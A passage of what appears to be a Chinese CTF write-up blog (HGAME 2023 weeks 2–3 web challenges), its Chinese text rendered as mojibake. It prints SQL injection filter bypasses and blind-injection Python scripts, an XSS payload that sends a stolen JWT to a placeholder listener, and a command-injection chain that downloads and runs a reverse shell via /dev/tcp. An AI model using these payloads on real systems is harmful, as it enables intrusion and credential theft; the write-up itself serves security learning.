class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;d&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;transfer_enable&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;banned&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;is_admin&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;is_staff&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;last_login_at&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;last_login_ip&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;uuid&quot;</span><span class="punctuation">:</span><span class="string">&quot;85a1c66e-d736-42b2-a0da-69f6fb066e90&quot;</span><span class="punctuation">,</span><span class="attr">&quot;group_id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;plan_id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;remind_expire&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;remind_traffic&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;39d580e71705f6abac9a414def74c466&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remarks&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;expired_at&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;created_at&quot;</span><span class="punctuation">:</span><span class="number">1673263308</span><span class="punctuation">,</span><span class="attr">&quot;updated_at&quot;</span><span class="punctuation">:</span><span class="number">1673267067</span><span class="punctuation">,</span><span class="attr">&quot;total_used&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;plan_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Vidar-Team Plane\ud83d\udee9&quot;</span><span class="punctuation">,</span><span class="attr">&quot;subscribe_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;http:\/\/week-2.hgame.lwsec.cn:31624\/api\/v1\/client\/subscribe?token=39d580e71705f6abac9a414def74c466&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;total&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>åŒ…è£¹ä¸Š<code>hgame</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;39d580e71705f6abac9a414def74c466&#125;</span><br></pre></td></tr></table></figure><h3 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h3><p>çˆ†ç ´å¾—åˆ°å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usernameï¼šuser01</span><br><span class="line">passwordï¼šadmin123</span><br></pre></td></tr></table></figure><p>ç™»é™†è¿›å»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search_id=1</span><br><span class="line">hard disk 1</span><br></pre></td></tr></table></figure><p>æµ‹è¯•äº†ä¸‹å‘ç°<code>ban</code>äº†ä¸€äº›å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select and or union ç©ºæ ¼ /**/ database =</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯<code>å¤§å†™</code>å¯ä»¥ç»•è¿‡ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æ³¨å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ˜¾ç¤º2 3</span><br><span class="line">search_id=(-1)Union/*a*/SelEct/*a*/1,2,3</span><br><span class="line"># se4rch 3</span><br><span class="line">search_id=(-1)UNION/*A*/SELECT/*A*/1,DATABASE(),3</span><br><span class="line"># 5ecret15here,L1st,user1nf0 3 (è¿™é‡Œæ³¨æ„informationé‡Œé¢æœ‰ä¸ªor)</span><br><span class="line">search_id=(-1)UNION/*A*/SELECT/*A*/1,(SELECT/*A*/GROUP_CONCAT(TABLE_NAME)FROM/*A*/INFORMATION_SCHEMA.TABLES/*A*/WHERE/*A*/TABLE_SCHEMA/*A*/LIKE/*A*/DATABASE()),3</span><br><span class="line"># f14gggg1shere 3</span><br><span class="line">search_id=(-1)UNION/*A*/SELECT/*A*/1,(SELECT/*A*/GROUP_CONCAT(COLUMN_NAME)FROM/*A*/INFORMATION_SCHEMA.COLUMNS/*A*/WHERE/*A*/TABLE_NAME/*A*/LIKE/*A*/&quot;5ecret15here&quot;),3</span><br><span class="line"># hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125; 3</span><br><span class="line">search_id=(-1)UNION/*A*/SELECT/*A*/1,(SELECT/*A*/GROUP_CONCAT(f14gggg1shere)/*A*/FROM/*A*/5ecret15here),3</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å†™è„šæœ¬ç›²æ³¨ï¼ˆæˆ‘å†™çš„å¾ˆæš´åŠ›ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:32118/search&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;_ga=GA1.1.41308100.1673534855; dark_mode=0; _ga_P1E9Z5LRRK=GS1.1.1673534854.1.1.1673536392.0.0.0; SESSION=MTY3MzY4NjE2MXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18p83DrKePiU6Cm-ll27huH1r-VNy8S_bQHxrgpjDZg9U=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;week-2.hgame.lwsec.cn:32118&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://week-2.hgame.lwsec.cn:32118&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://week-2.hgame.lwsec.cn:32118/home&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">old_res = res</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line"><span class="comment"># æ•°æ®åº“ se4rch</span></span><br><span class="line"><span class="comment"># payload = f&#x27;ascii(mid((SELECT(Database())),&#123;i&#125;,1))^&#123;j&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¡¨å 5ecret15here,L1st,user1nf0</span></span><br><span class="line"><span class="comment"># ä¹Ÿå¯ä»¥ç”¨DATABASE()ä»£æ›¿æ•°æ®åº“å</span></span><br><span class="line"><span class="comment"># payload = f&#x27;ascii(mid((SELECT(GROUP_CONCAT(TABLE_NAME))FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA)LIKE(&quot;se4rch&quot;)),&#123;i&#125;,1))^&#123;j&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å f14gggg1shere</span></span><br><span class="line"><span class="comment"># payload = f&#x27;ascii(mid((SELECT(GROUP_CONCAT(COLUMN_NAME))FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME)LIKE(&quot;5ecret15here&quot;)),&#123;i&#125;,1))^&#123;j&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;</span></span><br><span class="line">payload = <span class="string">f&#x27;ascii(mid((SELECT(GROUP_CONCAT(f14gggg1shere))FROM(5ecret15here)),<span class="subst">&#123;i&#125;</span>,1))^<span class="subst">&#123;j&#125;</span>&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;search_id&#x27;</span>:payload&#125;</span><br><span class="line">response = requests.post(url=url, headers=headers, data=data)</span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line"><span class="comment"># result = re.findall(r&#x27;&lt;div id=&quot;result&quot;&gt;(.*?)&lt;/div&gt;&#x27;, response.text, re.S)[0]</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;hard disk&#x27;</span> <span class="keyword">in</span> response.text):</span><br><span class="line">res += <span class="built_in">chr</span>(j^<span class="number">1</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> res == old_res:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h3 id="Designer"><a href="#Designer" class="headerlink" title="Designer"></a>Designer</h3><p>ç›´æ¥<code>admin</code>ç™»å½•ï¼Œ<code>share</code>é¡µé¢æœ‰æç¤º<code>admin will see it later</code></p><p>å®¡è®¡æºç åå‘ç°<code>register</code>è·¯ç”±æœ‰<code>flag</code>ï¼Œä½†æ˜¯è¦å†…éƒ¨è®¿é—®</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/register&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">  <span class="keyword">let</span> flag = <span class="string">&quot;hgame&#123;fake_flag_here&#125;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (username == <span class="string">&quot;admin&quot;</span> &amp;&amp; req.<span class="property">ip</span> == <span class="string">&quot;127.0.0.1&quot;</span> || req.<span class="property">ip</span> == <span class="string">&quot;::ffff:127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    flag = <span class="string">&quot;hgame&#123;true_flag_here&#125;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123; username, flag &#125;, secret)</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; token &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¯¥è·¯ç”±å­˜åœ¨<code>xss</code>æ¼æ´ï¼Œç¦ç”¨äº†ä¸€äº›å­—ç¬¦ï¼Œä½†å¯ä»¥ç”¨<code>eval</code>å’Œ<code>atob</code>ç»•è¿‡</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/button/preview&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> blacklist = [</span><br><span class="line">    <span class="regexp">/on/i</span>, <span class="regexp">/localStorage/i</span>, <span class="regexp">/alert/</span>, <span class="regexp">/fetch/</span>, <span class="regexp">/XMLHttpRequest/</span>, <span class="regexp">/window/</span>, <span class="regexp">/location/</span>, <span class="regexp">/document/</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> req.<span class="property">query</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="title function_">test</span>(key.<span class="title function_">trim</span>()) || item.<span class="title function_">test</span>(req.<span class="property">query</span>[key].<span class="title function_">trim</span>())) &#123;</span><br><span class="line">        req.<span class="property">query</span>[key] = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;preview&quot;</span>, &#123; <span class="attr">data</span>: req.<span class="property">query</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<code>share</code>è·¯ç”±æ¥æ’å…¥<code>payload</code>å’Œè®¿é—®</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/button/share&quot;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium&quot;</span>,</span><br><span class="line">    <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">  <span class="keyword">const</span> query = querystring.<span class="title function_">encode</span>(req.<span class="property">body</span>)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:9090/button/preview?&#x27;</span> + query)</span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;jwt_token_here&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;#button&quot;</span>)</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;admin will see it later&quot;</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ç¼–å†™<code>payload</code></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://127.0.0.1:9090/user/register&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;applicationjson&#x27;</span>);</span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (xhr.<span class="property">readyState</span> == <span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> xhr1 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr1.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://XXX.XXX.XX.XX:XXXX/&quot;</span>+xhr.<span class="property">responseText</span>);</span><br><span class="line">    xhr1.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;;</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br></pre></td></tr></table></figure><p>æœ¬åœ°å¼€å¯ç›‘å¬ï¼Œåœ¨<code>share</code>ç›´æ¥æ‰“</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/button/share</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZmxhZyI6ImhnYW1le2Zha2VfZmxhZ19oZXJlfSIsImlhdCI6MTY3Mzg4MDk1OX0.1TQg2QY5w4KiQ41LplIvQ6HCxXeSehgWosd5gFoi7Ho</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>714</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.1.41308100.1673534855; dark_mode=0; _ga_P1E9Z5LRRK=GS1.1.1673534854.1.1.1673536392.0.0.0; SESSION=MTY3MzY4NjE2MXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18p83DrKePiU6Cm-ll27huH1r-VNy8S_bQHxrgpjDZg9U=</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-2.hgame.lwsec.cn:30104</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://week-2.hgame.lwsec.cn:30104</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://week-2.hgame.lwsec.cn:30104/button/edit</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery">&#123;<span class="string">&quot;border-radius&quot;</span>:<span class="string">&quot;100px&quot;</span>,<span class="string">&quot;background-color&quot;</span>:<span class="string">&quot;#000000&quot;</span>,<span class="string">&quot;color&quot;</span>:<span class="string">&quot;#ffffff&quot;</span>,<span class="string">&quot;border-width&quot;</span>:<span class="string">&quot;1px&quot;</span>,<span class="string">&quot;box-shadow&quot;</span>:<span class="string">&quot;3px 3px #000&quot;</span>,<span class="string">&quot;test&quot;</span>:<span class="string">&quot;\&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;æ­¤å¤„å†™å…¥base64åŠ å¯†åçš„payloadå³å¯&#x27;</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&lt;\<span class="string">&quot;&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæŸ¥çœ‹ç›‘å¬å¾—åˆ°<code>token</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiaGdhbWV7Yl9jNHJlX2FiMHV0X3Byb3AzcnQxdHlfaW5qRWN0aU9ufSIsImlhdCI6MTY3Mzg4MTMyNn0.9cL849te3rbTdSDeEhR4Hy3TYk7VuL2nsJlu8aidjP4&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å»<a href="https://jwt.io/%E8%A7%A3%E5%AF%86%E5%8D%B3%E5%8F%AF">https://jwt.io/è§£å¯†å³å¯</a></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hgame&#123;b_c4re_ab0ut_prop3rt1ty_injEctiOn&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1673881326</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2><h3 id="Login-To-Get-My-Gift"><a href="#Login-To-Get-My-Gift" class="headerlink" title="Login To Get My Gift"></a>Login To Get My Gift</h3><p>ç™»å½•ç•Œé¢å­˜åœ¨<code>sql</code>æ³¨å…¥ï¼Œæµ‹è¯•åå‘ç°ç¦ç”¨ä¸€äº›å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">= ç©ºæ ¼ union like and</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>regexp</code>ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-_&#125;&#123;,&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://week-3.hgame.lwsec.cn:31678/login&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ l0g1nme </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;a&#x27;or(select/**/database()/**/regexp(\&quot;^&#123;flag+j&#125;\&quot;))#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å User1nf0mAt1on</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;a&#x27;or(select(select/**/group_concat(table_name)from/**/information_schema.tables)regexp(\&quot;^&#123;flag+j&#125;\&quot;))#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,usern4me,passw0rd</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;a&#x27;or(select(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/\&quot;User1nf0mAt1on\&quot;)regexp(\&quot;^&#123;flag+j&#125;\&quot;))#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ç”¨æˆ·å hgAmE2023HAppYnEwyEAr,testuser</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;a&#x27;or(select(select/**/group_concat(usern4me)from/**/User1nf0mAt1on)regexp/**/binary/**/\&quot;^&#123;flag+j&#125;\&quot;)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å¯†ç  WeLc0meT0hgAmE2023hAPPySql,testpassword</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;a&#x27;or(select(select/**/group_concat(passw0rd)from/**/User1nf0mAt1on)regexp/**/binary/**/\&quot;^<span class="subst">&#123;flag+j&#125;</span>\&quot;)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Success&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æœ€åç»“æœè¦åŒºåˆ†<code>å¤§å°å†™</code>ï¼Œä½¿ç”¨è¯¥è´¦æˆ·ç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=WeLc0meT0hgAmE2023hAPPySql&amp;username=hgAmE2023HAppYnEwyEAr</span><br></pre></td></tr></table></figure><p>ç™»é™†åè®¿é—®<code>\home</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;</span><br></pre></td></tr></table></figure><h3 id="Ping-To-The-Host"><a href="#Ping-To-The-Host" class="headerlink" title="Ping To The Host"></a>Ping To The Host</h3><p>éƒ¨ç½²ä¸€ä¸ªæ¶æ„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/xxx.xxx.xx.xx/xxxxxx 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>å…ˆä¸‹è½½æ¶æ„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1|wge\t%09http://xxx.xxx.xx.xx/exp</span><br></pre></td></tr></table></figure><p>ç„¶ååå¼¹shellå³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1|bas\h%09exp</span><br></pre></td></tr></table></figure><p>åœ¨æ ¹ç›®å½•ä¸‹å¾—åˆ°flag</p><p><img src="https://cdnjson.com/images/2023/02/05/ping.png" alt="ping.png"></p><p>é¡ºè·¯çœ‹ä¸‹æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        ip = request.form.get(<span class="string">&quot;ip&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ip:</span><br><span class="line">            mes = <span class="string">&quot;Your ip cannot be empty&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, message=mes)</span><br><span class="line">        invalid = waf(ip)</span><br><span class="line">        <span class="keyword">if</span> invalid:</span><br><span class="line">            mes = <span class="string">&quot;Waf!&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, message=mes)</span><br><span class="line">        res = os.system(<span class="string">&quot;ping -c 5 -w 15 &quot;</span> + ip)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">0</span>:</span><br><span class="line">            mes = <span class="string">&quot;Success&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, message=mes)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mes = <span class="string">&quot;Failed&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, message=mes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 